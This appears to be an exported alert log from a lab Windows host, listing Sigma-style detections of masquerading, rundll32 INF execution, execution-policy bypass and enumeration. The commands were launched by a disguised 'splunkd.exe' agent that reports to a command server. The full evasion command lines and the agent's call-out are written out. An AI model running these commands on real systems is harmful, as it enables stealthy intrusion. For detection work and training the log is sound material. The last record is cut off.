"2025-12-23 14:13:57.694 +01:00","Change PowerShell Policies to an Insecure Level","med","DESKTOP-G2OBL3D","Sysmon",1,"Exec","T1059.001","sysmon",172695,"Cmdline: powershell.exe -ExecutionPolicy Bypass -C ""copy \""1db90b_T1036.003.exe\"" ($env:TEMP + \""\svchost.exe\""); try { $myT1036_003 = (Start-Process -PassThru -FilePath ($env:TEMP + \""\svchost.exe\"")).Id }; catch { $_; exit $_.Exception.HResult}; Stop-Process -ID $myT1036_003"" ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ User: DESKTOP-G2OBL3D\student ¦ ParentCmdline: ""C:\Users\Public\splunkd.exe"" -server http://192.168.201.129:8888 -group red ¦ LID: 0x18b20 ¦ LGUID: E9F06A57-7C75-694A-208B-010000000000 ¦ PID: 4408 ¦ PGUID: E9F06A57-9595-694A-D702-000000002300 ¦ ParentPID: 2972 ¦ ParentPGUID: E9F06A57-8EA3-694A-5C02-000000002300 ¦ Description: Windows PowerShell ¦ Product: Microsoft® Windows® Operating System ¦ Company: Microsoft Corporation ¦ Hashes: MD5=909A2EEC5534F01DFF87B7D47E57BFF7,SHA256=D3B4B97C2BF97D70E5655FF4C4CA1D8CEF9DED51685CFD764247CFDA98EE68DF,IMPHASH=AFACF6DC9041114B198160AAB4D0AE77","CurrentDirectory: C:\WINDOWS\system32\ ¦ FileVersion: 10.0.26100.1 (WinBuild.160101.0800) ¦ IntegrityLevel: High ¦ OriginalFileName: PowerShell.EXE ¦ ParentImage: C:\Users\Public\splunkd.exe ¦ RuleName: - ¦ TerminalSessionId: 1 ¦ UtcTime: 2025-12-23 13:13:57.692","proc_creation_win_powershell_set_policies_to_unsecure_level.yml","6367ead5-724d-1865-8861-5eb5c91278d7","C:\Tools\Logs\mc_defense.evtx"
"2025-12-23 14:19:22.043 +01:00","Change PowerShell Policies to an Insecure Level","med","DESKTOP-G2OBL3D","Sysmon",1,"Exec","T1059.001","sysmon",172712,"Cmdline: powershell.exe -ExecutionPolicy Bypass -C ""$buffer = New-Object byte[] 11; $handle = New-Object IO.FileStream \""\\.\C:\"", 'Open', 'Read', 'ReadWrite'; $handle.Read($buffer, 0, $buffer.Length); $handle.Close(); Format-Hex -InputObject $buffer"" ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ User: DESKTOP-G2OBL3D\student ¦ ParentCmdline: ""C:\Users\Public\splunkd.exe"" -server http://192.168.201.129:8888 -group red ¦ LID: 0x18b20 ¦ LGUID: E9F06A57-7C75-694A-208B-010000000000 ¦ PID: 3168 ¦ PGUID: E9F06A57-96DA-694A-E602-000000002300 ¦ ParentPID: 2972 ¦ ParentPGUID: E9F06A57-8EA3-694A-5C02-000000002300 ¦ Description: Windows PowerShell ¦ Product: Microsoft® Windows® Operating System ¦ Company: Microsoft Corporation ¦ Hashes: MD5=909A2EEC5534F01DFF87B7D47E57BFF7,SHA256=D3B4B97C2BF97D70E5655FF4C4CA1D8CEF9DED51685CFD764247CFDA98EE68DF,IMPHASH=AFACF6DC9041114B198160AAB4D0AE77","CurrentDirectory: C:\WINDOWS\system32\ ¦ FileVersion: 10.0.26100.1 (WinBuild.160101.0800) ¦ IntegrityLevel: High ¦ OriginalFileName: PowerShell.EXE ¦ ParentImage: C:\Users\Public\splunkd.exe ¦ RuleName: - ¦ TerminalSessionId: 1 ¦ UtcTime: 2025-12-23 13:19:22.037","proc_creation_win_powershell_set_policies_to_unsecure_level.yml","6367ead5-724d-1865-8861-5eb5c91278d7","C:\Tools\Logs\mc_defense.evtx"
"2025-12-23 14:16:22.002 +01:00","Potential Defense Evasion Via Binary Rename","med","DESKTOP-G2OBL3D","Sysmon",1,"Evas","T1036.003","sysmon",172706,"Cmdline: C:\lsm.exe /c echo T1036.003 ¦ Proc: C:\lsm.exe ¦ User: DESKTOP-G2OBL3D\student ¦ ParentCmdline: cmd.exe /C copy C:\Windows\System32\cmd.exe C:\lsm.exe && C:\lsm.exe /c echo T1036.003 > C:\T1036.003.txt ¦ LID: 0x18b20 ¦ LGUID: E9F06A57-7C75-694A-208B-010000000000 ¦ PID: 6408 ¦ PGUID: E9F06A57-9625-694A-E002-000000002300 ¦ ParentPID: 1012 ¦ ParentPGUID: E9F06A57-9625-694A-DF02-000000002300 ¦ Description: Windows Command Processor ¦ Product: Microsoft® Windows® Operating System ¦ Company: Microsoft Corporation ¦ Hashes: MD5=FE48494F2B5A9C452F12E9BBE93A6BE6,SHA256=746C77047FC973F7CA66F8AF28274A30E05F4BB1751EE8A2C6546D9DA48E1115,IMPHASH=EDEF5A2A98D730D4288FE684BA0B0E00","CurrentDirectory: C:\Windows\System32\ ¦ FileVersion: 10.0.26100.2454 (WinBuild.160101.0800) ¦ IntegrityLevel: High ¦ OriginalFileName: Cmd.Exe ¦ ParentImage: C:\Windows\System32\cmd.exe ¦ RuleName: - ¦ TerminalSessionId: 1 ¦ UtcTime: 2025-12-23 13:16:21.998","proc_creation_win_renamed_binary.yml","0b333755-398c-777a-1cdf-637d7e1453a1","C:\Tools\Logs\mc_defense.evtx"
"2025-12-23 14:18:25.060 +01:00","Potential Defense Evasion Via Binary Rename","med","DESKTOP-G2OBL3D","Sysmon",1,"Evas","T1036.003","sysmon",172711,"Cmdline: C:\WINDOWS\Temp\lsass.exe /B ¦ Proc: C:\Windows\Temp\lsass.exe ¦ User: DESKTOP-G2OBL3D\student ¦ ParentCmdline: cmd.exe /C copy %SystemRoot%\System32\cmd.exe %SystemRoot%\Temp\lsass.exe && %SystemRoot%\Temp\lsass.exe /B ¦ LID: 0x18b20 ¦ LGUID: E9F06A57-7C75-694A-208B-010000000000 ¦ PID: 8880 ¦ PGUID: E9F06A57-96A1-694A-E502-000000002300 ¦ ParentPID: 3648 ¦ ParentPGUID: E9F06A57-96A0-694A-E402-000000002300 ¦ Description: Windows Command Processor ¦ Product: Microsoft® Windows® Operating System ¦ Company: Microsoft Corporation ¦ Hashes: MD5=FE48494F2B5A9C452F12E9BBE93A6BE6,SHA256=746C77047FC973F7CA66F8AF28274A30E05F4BB1751EE8A2C6546D9DA48E1115,IMPHASH=EDEF5A2A98D730D4288FE684BA0B0E00","CurrentDirectory: C:\Windows\System32\ ¦ FileVersion: 10.0.26100.2454 (WinBuild.160101.0800) ¦ IntegrityLevel: High ¦ OriginalFileName: Cmd.Exe ¦ ParentImage: C:\Windows\System32\cmd.exe ¦ RuleName: - ¦ TerminalSessionId: 1 ¦ UtcTime: 2025-12-23 13:18:25.056","proc_creation_win_renamed_binary.yml","0b333755-398c-777a-1cdf-637d7e1453a1","C:\Tools\Logs\mc_defense.evtx"
"2025-12-23 14:07:52.796 +01:00","Potential Defense Evasion Via Rename Of Highly Relevant Binaries","high","DESKTOP-G2OBL3D","Sysmon",1,"Evas","T1036.003","car.2013-05-009 ¦ sysmon",172640,"Cmdline: ""C:\Windows\Temp\debug.exe"" get-process ¦ Proc: C:\Windows\Temp\debug.exe ¦ User: DESKTOP-G2OBL3D\student ¦ ParentCmdline: powershell.exe -ExecutionPolicy Bypass -C ""Copy-Item C:\Windows\system32\WindowsPowerShell\v1.0\powershell.exe C:\Windows\Temp\debug.exe;C:\Windows\Temp\debug.exe get-process >> C:\Windows\temp\debug.log;C:\Windows\Temp\debug.exe get-localgroup >> C:\Windows\temp\debug.log;C:\Windows\Temp\debug.exe get-localuser >> C:\Windows\temp\debug.log;C:\Windows\Temp\debug.exe Get-ItemProperty Registry::HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion >> C:\Windows\temp\debug.log;"" ¦ LID: 0x18b20 ¦ LGUID: E9F06A57-7C75-694A-208B-010000000000 ¦ PID: 8840 ¦ PGUID: E9F06A57-9428-694A-B402-000000002300 ¦ ParentPID: 4400 ¦ ParentPGUID: E9F06A57-9428-694A-B302-000000002300 ¦ Description: Windows PowerShell ¦ Product: Microsoft® Windows® Operating System ¦ Company: Microsoft Corporation ¦ Hashes: MD5=909A2EEC5534F01DFF87B7D47E57BFF7,SHA256=D3B4B97C2BF97D70E5655FF4C4CA1D8CEF9DED51685CFD764247CFDA98EE68DF,IMPHASH=AFACF6DC9041114B198160AAB4D0AE77","CurrentDirectory: C:\WINDOWS\system32\ ¦ FileVersion: 10.0.26100.1 (WinBuild.160101.0800) ¦ IntegrityLevel: High ¦ OriginalFileName: PowerShell.EXE ¦ ParentImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ RuleName: - ¦ TerminalSessionId: 1 ¦ UtcTime: 2025-12-23 13:07:52.792","proc_creation_win_renamed_binary_highly_relevant.yml","b3af5e37-931c-e958-27e9-6b3e015c5147","C:\Tools\Logs\mc_defense.evtx"
"2025-12-23 14:07:53.276 +01:00","Potential Defense Evasion Via Rename Of Highly Relevant Binaries","high","DESKTOP-G2OBL3D","Sysmon",1,"Evas","T1036.003","car.2013-05-009 ¦ sysmon",172642,"Cmdline: ""C:\Windows\Temp\debug.exe"" get-localgroup ¦ Proc: C:\Windows\Temp\debug.exe ¦ User: DESKTOP-G2OBL3D\student ¦ ParentCmdline: powershell.exe -ExecutionPolicy Bypass -C ""Copy-Item C:\Windows\system32\WindowsPowerShell\v1.0\powershell.exe C:\Windows\Temp\debug.exe;C:\Windows\Temp\debug.exe get-process >> C:\Windows\temp\debug.log;C:\Windows\Temp\debug.exe get-localgroup >> C:\Windows\temp\debug.log;C:\Windows\Temp\debug.exe get-localuser >> C:\Windows\temp\debug.log;C:\Windows\Temp\debug.exe Get-ItemProperty Registry::HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion >> C:\Windows\temp\debug.log;"" ¦ LID: 0x18b20 ¦ LGUID: E9F06A57-7C75-694A-208B-010000000000 ¦ PID: 8540 ¦ PGUID: E9F06A57-9429-694A-B502-000000002300 ¦ ParentPID: 4400 ¦ ParentPGUID: E9F06A57-9428-694A-B302-000000002300 ¦ Description: Windows PowerShell ¦ Product: Microsoft® Windows® Operating System ¦ Company: Microsoft Corporation ¦ Hashes: MD5=909A2EEC5534F01DFF87B7D47E57BFF7,SHA256=D3B4B97C2BF97D70E5655FF4C4CA1D8CEF9DED51685CFD764247CFDA98EE68DF,IMPHASH=AFACF6DC9041114B198160AAB4D0AE77","CurrentDirectory: C:\WINDOWS\system32\ ¦ FileVersion: 10.0.26100.1 (WinBuild.160101.0800) ¦ IntegrityLevel: High ¦ OriginalFileName: PowerShell.EXE ¦ ParentImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ RuleName: - ¦ TerminalSessionId: 1 ¦ UtcTime: 2025-12-23 13:07:53.275","proc_creation_win_renamed_binary_highly_relevant.yml","b3af5e37-931c-e958-27e9-6b3e015c5147","C:\Tools\Logs\mc_defense.evtx"
"2025-12-23 14:07:53.625 +01:00","Potential Defense Evasion Via Rename Of Highly Relevant Binaries","high","DESKTOP-G2OBL3D","Sysmon",1,"Evas","T1036.003","car.2013-05-009 ¦ sysmon",172644,"Cmdline: ""C:\Windows\Temp\debug.exe"" get-localuser ¦ Proc: C:\Windows\Temp\debug.exe ¦ User: DESKTOP-G2OBL3D\student ¦ ParentCmdline: powershell.exe -ExecutionPolicy Bypass -C ""Copy-Item C:\Windows\system32\WindowsPowerShell\v1.0\powershell.exe C:\Windows\Temp\debug.exe;C:\Windows\Temp\debug.exe get-process >> C:\Windows\temp\debug.log;C:\Windows\Temp\debug.exe get-localgroup >> C:\Windows\temp\debug.log;C:\Windows\Temp\debug.exe get-localuser >> C:\Windows\temp\debug.log;C:\Windows\Temp\debug.exe Get-ItemProperty Registry::HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion >> C:\Windows\temp\debug.log;"" ¦ LID: 0x18b20 ¦ LGUID: E9F06A57-7C75-694A-208B-010000000000 ¦ PID: 5320 ¦ PGUID: E9F06A57-9429-694A-B602-000000002300 ¦ ParentPID: 4400 ¦ ParentPGUID: E9F06A57-9428-694A-B302-000000002300 ¦ Description: Windows PowerShell ¦ Product: Microsoft® Windows® Operating System ¦ Company: Microsoft Corporation ¦ Hashes: MD5=909A2EEC5534F01DFF87B7D47E57BFF7,SHA256=D3B4B97C2BF97D70E5655FF4C4CA1D8CEF9DED51685CFD764247CFDA98EE68DF,IMPHASH=AFACF6DC9041114B198160AAB4D0AE77","CurrentDirectory: C:\WINDOWS\system32\ ¦ FileVersion: 10.0.26100.1 (WinBuild.160101.0800) ¦ IntegrityLevel: High ¦ OriginalFileName: PowerShell.EXE ¦ ParentImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ RuleName: - ¦ TerminalSessionId: 1 ¦ UtcTime: 2025-12-23 13:07:53.624","proc_creation_win_renamed_binary_highly_relevant.yml","b3af5e37-931c-e958-27e9-6b3e015c5147","C:\Tools\Logs\mc_defense.evtx"
"2025-12-23 14:07:53.905 +01:00","Potential Defense Evasion Via Rename Of Highly Relevant Binaries","high","DESKTOP-G2OBL3D","Sysmon",1,"Evas","T1036.003","car.2013-05-009 ¦ sysmon",172646,"Cmdline: ""C:\Windows\Temp\debug.exe"" Get-ItemProperty Registry::HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion ¦ Proc: C:\Windows\Temp\debug.exe ¦ User: DESKTOP-G2OBL3D\student ¦ ParentCmdline: powershell.exe -ExecutionPolicy Bypass -C ""Copy-Item C:\Windows\system32\WindowsPowerShell\v1.0\powershell.exe C:\Windows\Temp\debug.exe;C:\Windows\Temp\debug.exe get-process >> C:\Windows\temp\debug.log;C:\Windows\Temp\debug.exe get-localgroup >> C:\Windows\temp\debug.log;C:\Windows\Temp\debug.exe get-localuser >> C:\Windows\temp\debug.log;C:\Windows\Temp\debug.exe Get-ItemProperty Registry::HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion >> C:\Windows\temp\debug.log;"" ¦ LID: 0x18b20 ¦ LGUID: E9F06A57-7C75-694A-208B-010000000000 ¦ PID: 5248 ¦ PGUID: E9F06A57-9429-694A-B702-000000002300 ¦ ParentPID: 4400 ¦ ParentPGUID: E9F06A57-9428-694A-B302-000000002300 ¦ Description: Windows PowerShell ¦ Product: Microsoft® Windows® Operating System ¦ Company: Microsoft Corporation ¦ Hashes: MD5=909A2EEC5534F01DFF87B7D47E57BFF7,SHA256=D3B4B97C2BF97D70E5655FF4C4CA1D8CEF9DED51685CFD764247CFDA98EE68DF,IMPHASH=AFACF6DC9041114B198160AAB4D0AE77","CurrentDirectory: C:\WINDOWS\system32\ ¦ FileVersion: 10.0.26100.1 (WinBuild.160101.0800) ¦ IntegrityLevel: High ¦ OriginalFileName: PowerShell.EXE ¦ ParentImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ RuleName: - ¦ TerminalSessionId: 1 ¦ UtcTime: 2025-12-23 13:07:53.904","proc_creation_win_renamed_binary_highly_relevant.yml","b3af5e37-931c-e958-27e9-6b3e015c5147","C:\Tools\Logs\mc_defense.evtx"
"2025-12-23 14:17:02.959 +01:00","Potentially Suspicious Rundll32 Activity","med","DESKTOP-G2OBL3D","Sysmon",1,"Evas","T1218.011","sysmon",172707,"Cmdline: cmd.exe /C rundll32.exe setupapi.dll,InstallHinfSection DefaultInstall 128 ""4c870d_T1218.011_DefaultInstall.inf"" ¦ Proc: C:\Windows\System32\cmd.exe ¦ User: DESKTOP-G2OBL3D\student ¦ ParentCmdline: ""C:\Users\Public\splunkd.exe"" -server http://192.168.201.129:8888 -group red ¦ LID: 0x18b20 ¦ LGUID: E9F06A57-7C75-694A-208B-010000000000 ¦ PID: 4124 ¦ PGUID: E9F06A57-964E-694A-E102-000000002300 ¦ ParentPID: 2972 ¦ ParentPGUID: E9F06A57-8EA3-694A-5C02-000000002300 ¦ Description: Windows Command Processor ¦ Product: Microsoft® Windows® Operating System ¦ Company: Microsoft Corporation ¦ Hashes: MD5=FE48494F2B5A9C452F12E9BBE93A6BE6,SHA256=746C77047FC973F7CA66F8AF28274A30E05F4BB1751EE8A2C6546D9DA48E1115,IMPHASH=EDEF5A2A98D730D4288FE684BA0B0E00","CurrentDirectory: C:\WINDOWS\system32\ ¦ FileVersion: 10.0.26100.2454 (WinBuild.160101.0800) ¦ IntegrityLevel: High ¦ OriginalFileName: Cmd.Exe ¦ ParentImage: C:\Users\Public\splunkd.exe ¦ RuleName: - ¦ TerminalSessionId: 1 ¦ UtcTime: 2025-12-23 13:17:02.957","proc_creation_win_rundll32_susp_activity.yml","b17dd34d-c3a0-fedd-caee-48e18e8c161f","C:\Tools\Logs\mc_defense.evtx"
"2025-12-23 14:17:02.971 +01:00","Potentially Suspicious Rundll32 Activity","med","DESKTOP-G2OBL3D","Sysmon",1,"Evas","T1218.011","sysmon",172708,"Cmdline: rundll32.exe setupapi.dll,InstallHinfSection DefaultInstall 128 ""4c870d_T1218.011_DefaultInstall.inf"" ¦ Proc: C:\Windows\System32\rundll32.exe ¦ User: DESKTOP-G2OBL3D\student ¦ ParentCmdline: cmd.exe /C rundll32.exe setupapi.dll,InstallHinfSection DefaultInstall 128 ""4c870d_T1218.011_DefaultInstall.inf"" ¦ LID: 0x18b20 ¦ LGUID: E9F06A57-7C75-694A-208B-010000000000 ¦ PID: 8964 ¦ PGUID: E9F06A57-964E-694A-E202-000000002300 ¦ ParentPID: 4124 ¦ ParentPGUID: E9F06A57-964E-694A-E102-000000002300 ¦ Description: Windows host process (Rundll32) ¦ Product: Microsoft® Windows® Operating System ¦ Company: Microsoft Corporation ¦ Hashes: MD5=CBA4E8BBCFA49E5C546C138CF6E914F3,SHA256=9BACA6F9FD3F9330A880F13D449408395278C1923813EC8999C3ECD017111B5D,IMPHASH=3DB48F7E208E17408E177BD8B816560A","CurrentDirectory: C:\Windows\System32\ ¦ FileVersion: 10.0.26100.2454 (WinBuild.160101.0800) ¦ IntegrityLevel: High ¦ OriginalFileName: RUNDLL32.EXE ¦ ParentImage: C:\Windows\System32\cmd.exe ¦ RuleName: - ¦ TerminalSessionId: 1 ¦ UtcTime: 2025-12-23 13:17:02.970","proc_creation_win_rundll32_susp_activity.yml","b17dd34d-c3a0-fedd-caee-48e18e8c161f","C:\Tools\Logs\mc_defense.evtx"
"2025-12-23 14:07:52.437 +01:00","Suspicious Copy From or To System Directory","med","DESKTOP-G2OBL3D","Sysmon",1,"Evas","T1036.003","sysmon",172637,"Cmdline: powershell.exe -ExecutionPolicy Bypass -C ""Copy-Item C:\Windows\system32\WindowsPowerShell\v1.0\powershell.exe C:\Windows\Temp\debug.exe;C:\Windows\Temp\debug.exe get-process >> C:\Windows\temp\debug.log;C:\Windows\Temp\debug.exe get-localgroup >> C:\Windows\temp\debug.log;C:\Windows\Temp\debug.exe get-localuser >> C:\Windows\temp\debug.log;C:\Windows\Temp\debug.exe Get-ItemProperty Registry::HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion >> C:\Windows\temp\debug.log;"" ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ User: DESKTOP-G2OBL3D\student ¦ ParentCmdline: ""C:\Users\Public\splunkd.exe"" -server http://192.168.201.129:8888 -group red ¦ LID: 0x18b20 ¦ LGUID: E9F06A57-7C75-694A-208B-010000000000 ¦ PID: 4400 ¦ PGUID: E9F06A57-9428-694A-B302-000000002300 ¦ ParentPID: 2972 ¦ ParentPGUID: E9F06A57-8EA3-694A-5C02-000000002300 ¦ Description: Windows PowerShell ¦ Product: Microsoft® Windows® Operating System ¦ Company: Microsoft Corporation ¦ Hashes: MD5=909A2EEC5534F01DFF87B7D47E57BFF7,SHA256=D3B4B97C2BF97D70E5655FF4C4CA1D8CEF9DED51685CFD764247CFDA98EE68DF,IMPHASH=AFACF6DC9041114B198160AAB4D0AE77","CurrentDirectory: C:\WINDOWS\system32\ ¦ FileVersion: 10.0.26100.1 (WinBuild.160101.0800) ¦ IntegrityLevel: High ¦ OriginalFileName: PowerShell.EXE ¦ ParentImage: C:\Users\Public\splunkd.exe ¦ RuleName: - ¦ TerminalSessionId: 1 ¦ UtcTime: 2025-12-23 13:07:52.428","proc_creation_win_susp_copy_system_dir.yml","9b247f9f-5c06-6372-8386-d0e535022fc9","C:\Tools\Logs\mc_defense.evtx"
"2025-12-23 14:12:37.707 +01:00","Suspicious Copy From or To System Directory","med","DESKTOP-G2OBL3D","Sysmon",1,"Evas","T1036.003","sysmon",172664,"Cmdline: cmd.exe /C copy ""C:\Windows\System32\calc.exe"" %%temp%%\T1036.007_masquerading.docx.exe /Y && copy ""C:\Windows\System32\calc.exe"" %%temp%%\T1036.007_masquerading.pdf.exe /Y && copy ""C:\Windows\System32\calc.exe"" %%temp%%\T1036.007_masquerading.ps1.exe /Y && copy ""4bd145_T1036.007_masquerading.vbs"" %%temp%%\T1036.007_masquerading.xls.vbs /Y && copy ""4bd145_T1036.007_masquerading.vbs"" %%temp%%\T1036.007_masquerading.xlsx.vbs /Y && copy ""4bd145_T1036.007_masquerading.vbs"" %%temp%%\T1036.007_masquerading.png.vbs /Y && copy ""107417_T1036.007_masquerading.ps1"" %%temp%%\T1036.007_masquerading.doc.ps1 /Y && copy ""107417_T1036.007_masquerading.ps1"" %%temp%%\T1036.007_masquerading.pdf.ps1 /Y && copy ""107417_T1036.007_masquerading.ps1"" %%temp%%\T1036.007_masquerading.rtf.ps1 /Y && %%temp%%\T1036.007_masquerading.docx.exe && %%temp%%\T1036.007_masquerading.pdf.exe && %%temp%%\T1036.007_masquerading.ps1.exe && %%temp%%\T1036.007_masquerading.xls.vbs && %%temp%%\T1036.007_masquerading.xlsx.vbs && %%temp%%\T1036.007_masquerading.png.vbs && C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -File %%temp%%\T1036.007_masquerading.doc.ps1 && C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -File %%temp%%\T1036.007_masquerading.pdf.ps1 && C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -File %%temp%%\T1036.007_masquerading.rtf.ps1 ¦ Proc: C:\Windows\System32\cmd.exe ¦ User: DESKTOP-G2OBL3D\student ¦ ParentCmdline: ""C:\Users\Public\splunkd.exe"" -server http://192.168.201.129:8888 -group red ¦ LID: 0x18b20 ¦ LGUID: E9F06A57-7C75-694A-208B-010000000000 ¦ PID: 8516 ¦ PGUID: E9F06A57-9545-694A-C402-000000002300 ¦ ParentPID: 2972 ¦ ParentPGUID: E9F06A57-8EA3-694A-5C02-000000002300 ¦ Description: Windows Command Processor ¦ Product: Microsoft® Windows® Operating System ¦ Company: Microsoft Corporation ¦ Hashes: MD5=FE48494F2B5A9C452F12E9BBE93A6BE6,SHA256=746C77047FC973F7CA66F8AF28274A30E05F4BB1751EE8A2C6546D9DA48E1115,IMPHASH=EDEF5A2A98D730D4288FE684BA0B0E00","CurrentDirectory: C:\WINDOWS\system32\ ¦ FileVersion: 10.0.26100.2454 (WinBuild.160101.0800) ¦ IntegrityLevel: High ¦ OriginalFileName: Cmd.Exe ¦ ParentImage: C:\Users\Public\splunkd.exe ¦ RuleName: - ¦ TerminalSessionId: 1 ¦ UtcTime: 2025-12-23 13:12:37.680","proc_creation_win_susp_copy_system_dir.yml","9b247f9f-5c06-6372-8386-d0e535022fc9","C:\Tools\Logs\mc_defense.evtx"
"2025-12-23 14:16:21.945 +01:00","Suspicious Copy From or To System Directory","med","DESKTOP-G2OBL3D","Sysmon",1,"Evas","T1036.003","sysmon",172704,"Cmdline: cmd.exe /C copy C:\Windows\System32\cmd.exe C:\lsm.exe && C:\lsm.exe /c echo T1036.003 > C:\T1036.003.txt ¦ Proc: C:\Windows\System32\cmd.exe ¦ User: DESKTOP-G2OBL3D\student ¦ ParentCmdline: ""C:\Users\Public\splunkd.exe"" -server http://192.168.201.129:8888 -group red ¦ LID: 0x18b20 ¦ LGUID: E9F06A57-7C75-694A-208B-010000000000 ¦ PID: 1012 ¦ PGUID: E9F06A57-9625-694A-DF02-000000002300 ¦ ParentPID: 2972 ¦ ParentPGUID: E9F06A57-8EA3-694A-5C02-000000002300 ¦ Description: Windows Command Processor ¦ Product: Microsoft® Windows® Operating System ¦ Company: Microsoft Corporation ¦ Hashes: MD5=FE48494F2B5A9C452F12E9BBE93A6BE6,SHA256=746C77047FC973F7CA66F8AF28274A30E05F4BB1751EE8A2C6546D9DA48E1115,IMPHASH=EDEF5A2A98D730D4288FE684BA0B0E00","CurrentDirectory: C:\WINDOWS\system32\ ¦ FileVersion: 10.0.26100.2454 (WinBuild.160101.0800) ¦ IntegrityLevel: High ¦ OriginalFileName: Cmd.Exe ¦ ParentImage: C:\Users\Public\splunkd.exe ¦ RuleName: - ¦ TerminalSessionId: 1 ¦ UtcTime: 2025-12-23 13:16:21.934","proc_creation_win_susp_copy_system_dir.yml","9b247f9f-5c06-6372-8386-d0e535022fc9","C:\Tools\Logs\mc_defense.evtx"
"2025-12-23 14:12:37.707 +01:00","LOL-Binary Copied From System Directory","high","DESKTOP-G2OBL3D","Sysmon",1,"Evas","T1036.003","sysmon",172664,"Cmdline: cmd.exe /C copy ""C:\Windows\System32\calc.exe"" %%temp%%\T1036.007_masquerading.docx.exe /Y && copy ""C:\Windows\System32\calc.exe"" %%temp%%\T1036.007_masquerading.pdf.exe /Y && copy ""C:\Windows\System32\calc.exe"" %%temp%%\T1036.007_masquerading.ps1.exe /Y && copy ""4bd145_T1036.007_masquerading.vbs"" %%temp%%\T1036.007_masquerading.xls.vbs /Y && copy ""4bd145_T1036.007_masquerading.vbs"" %%temp%%\T1036.007_masquerading.xlsx.vbs /Y && copy ""4bd145_T1036.007_masquerading.vbs"" %%temp%%\T1036.007_masquerading.png.vbs /Y && copy ""107417_T1036.007_masquerading.ps1"" %%temp%%\T1036.007_masquerading.doc.ps1 /Y && copy ""107417_T1036.007_masquerading.ps1"" %%temp%%\T1036.007_masquerading.pdf.ps1 /Y && copy ""107417_T1036.007_masquerading.ps1"" %%temp%%\T1036.007_masquerading.rtf.ps1 /Y && %%temp%%\T1036.007_masquerading.docx.exe && %%temp%%\T1036.007_masquerading.pdf.exe && %%temp%%\T1036.007_masquerading.ps1.exe && %%temp%%\T1036.007_masquerading.xls.vbs && %%temp%%\T1036.007_masquerading.xlsx.vbs && %%temp%%\T1036.007_masquerading.png.vbs && C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -File %%temp%%\T1036.007_masquerading.doc.ps1 && C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -File %%temp%%\T1036.007_masquerading.pdf.ps1 && C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -File %%temp%%\T1036.007_masquerading.rtf.ps1 ¦ Proc: C:\Windows\System32\cmd.exe ¦ User: DESKTOP-G2OBL3D\student ¦ ParentCmdline: ""C:\Users\Public\splunkd.exe"" -server http://192.168.201.129:8888 -group red ¦ LID: 0x18b20 ¦ LGUID: E9F06A57-7C75-694A-208B-010000000000 ¦ PID: 8516 ¦ PGUID: E9F06A57-9545-694A-C402-000000002300 ¦ ParentPID: 2972 ¦ ParentPGUID: E9F06A57-8EA3-694A-5C02-000000002300 ¦ Description: Windows Command Processor ¦ Product: Microsoft® Windows® Operating System ¦ Company: Microsoft Corporation ¦ Hashes: MD5=FE48494F2B5A9C452F12E9BBE93A6BE6,SHA256=746C77047FC973F7CA66F8AF28274A30E05F4BB1751EE8A2C6546D9DA48E1115,IMPHASH=EDEF5A2A98D730D4288FE684BA0B0E00","CurrentDirectory: C:\WINDOWS\system32\ ¦ FileVersion: 10.0.26100.2454 (WinBuild.160101.0800) ¦ IntegrityLevel: High ¦ OriginalFileName: Cmd.Exe ¦ ParentImage: C:\Users\Public\splunkd.exe ¦ RuleName: - ¦ TerminalSessionId: 1 ¦ UtcTime: 2025-12-23 13:12:37.680","proc_creation_win_susp_copy_system_dir_lolbin.yml","8fb84f5c-c692-9a7e-f78e-236822f3687a","C:\Tools\Logs\mc_defense.evtx"
"2025-12-23 14:12:37.758 +01:00","Suspicious Double Extension File Execution","high","DESKTOP-G2OBL3D","Sysmon",1,"InitAccess","T1566.001","sysmon",172674,"Cmdline: C:\Users\student\AppData\Local\Temp\T1036.007_masquerading.docx.exe ¦ Proc: C:\Users\student\AppData\Local\Temp\T1036.007_masquerading.docx.exe ¦ User: DESKTOP-G2OBL3D\student ¦ ParentCmdline: cmd.exe /C copy ""C:\Windows\System32\calc.exe"" %temp%\T1036.007_masquerading.docx.exe /Y && copy ""C:\Windows\System32\calc.exe"" %temp%\T1036.007_masquerading.pdf.exe /Y && copy ""C:\Windows\System32\calc.exe"" %temp%\T1036.007_masquerading.ps1.exe /Y && copy ""4bd145_T1036.007_masquerading.vbs"" %temp%\T1036.007_masquerading.xls.vbs /Y && copy ""4bd145_T1036.007_masquerading.vbs"" %temp%\T1036.007_masquerading.xlsx.vbs /Y && copy ""4bd145_T1036.007_masquerading.vbs"" %temp%\T1036.007_masquerading.png.vbs /Y && copy ""107417_T1036.007_masquerading.ps1"" %temp%\T1036.007_masquerading.doc.ps1 /Y && copy ""107417_T1036.007_masquerading.ps1"" %temp%\T1036.007_masquerading.pdf.ps1 /Y && copy ""107417_T1036.007_masquerading.ps1"" %temp%\T1036.007_masquerading.rtf.ps1 /Y && %temp%\T1036.007_masquerading.docx.exe && %temp%\T1036.007_masquerading.pdf.exe && %temp%\T1036.007_masquerading.ps1.exe && %temp%\T1036.007_masquerading.xls.vbs && %temp%\T1036.007_masquerading.xlsx.vbs && %temp%\T1036.007_masquerading.png.vbs && C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -File %temp%\T1036.007_masquerading.doc.ps1 && C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -File %temp%\T1036.007_masquerading.pdf.ps1 && 